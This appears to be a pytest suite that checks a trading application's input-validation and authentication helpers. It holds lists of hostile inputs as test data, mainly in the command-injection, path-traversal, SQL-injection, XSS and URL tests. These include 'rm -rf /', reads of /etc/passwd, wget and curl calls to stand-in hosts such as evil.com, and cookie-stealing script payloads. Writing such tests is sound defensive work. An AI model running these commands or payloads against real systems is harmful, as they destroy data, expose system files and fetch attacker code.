"""
Test suite for input validation security.

Tests comprehensive input validation patterns to prevent:
- SQL injection
- Command injection
- Path traversal
- XSS attacks
- Integer overflow
- Buffer overflow attempts
"""

import pytest
from pathlib import Path
import os


class TestInputValidation:
    """Test input validation security controls."""

    def test_numeric_input_validation(self):
        """Test that numeric inputs are properly validated."""
        from core.security.validation import validate_numeric_input
        
        # Valid inputs
        assert validate_numeric_input(100.5) == 100.5
        assert validate_numeric_input(0) == 0
        assert validate_numeric_input(-10.5) == -10.5
        
        # Invalid inputs should raise ValueError
        with pytest.raises(ValueError):
            validate_numeric_input("not_a_number")
        
        with pytest.raises(ValueError):
            validate_numeric_input(None)
        
        with pytest.raises(ValueError):
            validate_numeric_input("100'; DROP TABLE trades;--")

    def test_string_input_sanitization(self):
        """Test that string inputs are properly sanitized."""
        from core.security.validation import sanitize_string_input
        
        # SQL injection attempts
        malicious_inputs = [
            "'; DROP TABLE users;--",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM passwords--",
            "<script>alert('XSS')</script>",
        ]
        
        for malicious in malicious_inputs:
            sanitized = sanitize_string_input(malicious)
            # Should not contain SQL metacharacters or script tags
            assert "DROP TABLE" not in sanitized.upper()
            assert "UNION SELECT" not in sanitized.upper()
            assert "<script>" not in sanitized.lower()
            assert "'" not in sanitized or sanitized.count("'") % 2 == 0

    def test_path_traversal_prevention(self):
        """Test that path traversal attacks are prevented."""
        from core.security.validation import validate_file_path
        
        base_dir = "/app/data"
        
        # Valid paths
        assert validate_file_path("config.yaml", base_dir)
        assert validate_file_path("subdir/config.yaml", base_dir)
        
        # Path traversal attempts should be rejected
        traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "config.yaml/../../../etc/passwd",
            "/etc/passwd",
            "\\\\network\\share\\file",
            "data/../../etc/passwd",
        ]
        
        for attempt in traversal_attempts:
            with pytest.raises(ValueError, match="Invalid file path"):
                validate_file_path(attempt, base_dir)

    def test_command_injection_prevention(self):
        """Test that command injection is prevented."""
        from core.security.validation import validate_command_arg
        
        # Valid arguments
        assert validate_command_arg("data.csv")
        assert validate_command_arg("report_2024.pdf")
        
        # Command injection attempts should be rejected
        injection_attempts = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "& wget malicious.com/script.sh",
            "$(whoami)",
            "`id`",
            "file.txt && curl evil.com",
        ]
        
        for attempt in injection_attempts:
            with pytest.raises(ValueError, match="Invalid command argument"):
                validate_command_arg(attempt)

    def test_xss_prevention(self):
        """Test that XSS attacks are prevented."""
        from core.security.validation import sanitize_html_input
        
        xss_attempts = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "javascript:alert(document.cookie)",
            "<svg/onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
        ]
        
        for xss in xss_attempts:
            sanitized = sanitize_html_input(xss)
            # Should not contain script tags or event handlers
            assert "<script>" not in sanitized.lower()
            assert "javascript:" not in sanitized.lower()
            assert "onerror=" not in sanitized.lower()
            assert "onload=" not in sanitized.lower()

    def test_integer_overflow_prevention(self):
        """Test that integer overflow is handled safely."""
        from core.security.validation import validate_integer_range
        
        # Valid ranges
        assert validate_integer_range(100, 0, 1000) == 100
        assert validate_integer_range(0, 0, 100) == 0
        
        # Out of range should raise ValueError
        with pytest.raises(ValueError):
            validate_integer_range(2**63, 0, 2**31)
        
        with pytest.raises(ValueError):
            validate_integer_range(-2**63, 0, 2**31)

    def test_url_validation(self):
        """Test that URLs are properly validated."""
        from core.security.validation import validate_url
        
        # Valid URLs
        valid_urls = [
            "https://api.tradepulse.com/data",
            "http://localhost:8080/health",
            "https://exchange.com/api/v1/trades",
        ]
        
        for url in valid_urls:
            assert validate_url(url)
        
        # Invalid URLs should be rejected
        invalid_urls = [
            "file:///etc/passwd",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "ftp://internal.network/secrets",
            "//evil.com/redirect",
        ]
        
        for url in invalid_urls:
            with pytest.raises(ValueError):
                validate_url(url, allowed_schemes=["http", "https"])

    def test_email_validation(self):
        """Test that email addresses are properly validated."""
        from core.security.validation import validate_email
        
        # Valid emails
        valid_emails = [
            "user@example.com",
            "test.user@tradepulse.com",
            "admin+tag@domain.co.uk",
        ]
        
        for email in valid_emails:
            assert validate_email(email)
        
        # Invalid emails
        invalid_emails = [
            "not-an-email",
            "@example.com",
            "user@",
            "user@.com",
            "user space@example.com",
            "user@exam ple.com",
        ]
        
        for email in invalid_emails:
            with pytest.raises(ValueError):
                validate_email(email)

    def test_json_payload_validation(self):
        """Test that JSON payloads are properly validated."""
        from core.security.validation import validate_json_payload
        
        # Valid JSON
        valid_payload = '{"symbol": "AAPL", "quantity": 100}'
        assert validate_json_payload(valid_payload)
        
        # Invalid JSON should raise ValueError
        with pytest.raises(ValueError):
            validate_json_payload("not json")
        
        # Oversized payloads should be rejected
        oversized = '{"data": "' + 'x' * (10 * 1024 * 1024) + '"}'
        with pytest.raises(ValueError, match="exceeds maximum size"):
            validate_json_payload(oversized, max_size=1024 * 1024)

    def test_file_upload_validation(self):
        """Test that file uploads are properly validated."""
        from core.security.validation import validate_file_upload
        
        # Valid file types
        assert validate_file_upload("data.csv", allowed_extensions=[".csv", ".txt"])
        assert validate_file_upload("report.pdf", allowed_extensions=[".pdf"])
        
        # Invalid file types should be rejected
        with pytest.raises(ValueError):
            validate_file_upload("script.exe", allowed_extensions=[".csv", ".pdf"])
        
        with pytest.raises(ValueError):
            validate_file_upload("malware.sh", allowed_extensions=[".csv", ".pdf"])

    def test_api_key_validation(self):
        """Test that API keys are properly validated."""
        from core.security.validation import validate_api_key
        
        # Valid API key format (alphanumeric, specific length)
        # Note: This is a test example, not a real API key
        valid_key = "test_key_abcd1234efgh5678ijkl9012mnop"
        assert validate_api_key(valid_key, min_length=20, max_length=50)
        
        # Invalid keys
        with pytest.raises(ValueError):
            validate_api_key("short", min_length=20, max_length=50)
        
        with pytest.raises(ValueError):
            validate_api_key("key with spaces", min_length=10, max_length=50)
        
        with pytest.raises(ValueError):
            validate_api_key("key;DROP TABLE;", min_length=10, max_length=50)


class TestSQLInjectionPrevention:
    """Test SQL injection prevention measures."""

    def test_parameterized_queries(self):
        """Test that parameterized queries are used."""
        from core.database.query_builder import build_query
        
        # Should use parameterized queries, not string concatenation
        symbol = "AAPL'; DROP TABLE trades;--"
        query, params = build_query("SELECT * FROM trades WHERE symbol = ?", (symbol,))
        
        assert "?" in query or "$1" in query  # Placeholder exists
        assert symbol in params  # Parameter is separate
        assert "DROP TABLE" not in query  # SQL injection not in query

    def test_orm_injection_prevention(self):
        """Test that ORM prevents SQL injection."""
        # This would test actual ORM usage if applicable
        # For now, document the pattern
        pass


class TestAuthenticationSecurity:
    """Test authentication and authorization security."""

    def test_password_hashing(self):
        """Test that passwords are properly hashed."""
        from core.security.auth import hash_password, verify_password
        
        password = "SecurePassword123!"
        hashed = hash_password(password)
        
        # Hash should not contain the original password
        assert password not in hashed
        # Hash should be different each time (salt)
        assert hash_password(password) != hashed
        # Verification should work
        assert verify_password(password, hashed)
        assert not verify_password("WrongPassword", hashed)

    def test_session_token_generation(self):
        """Test that session tokens are cryptographically secure."""
        from core.security.auth import generate_session_token
        
        token1 = generate_session_token()
        token2 = generate_session_token()
        
        # Tokens should be unique
        assert token1 != token2
        # Tokens should be sufficiently long
        assert len(token1) >= 32
        # Tokens should be random (not predictable)
        assert token1[:10] != token2[:10]


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
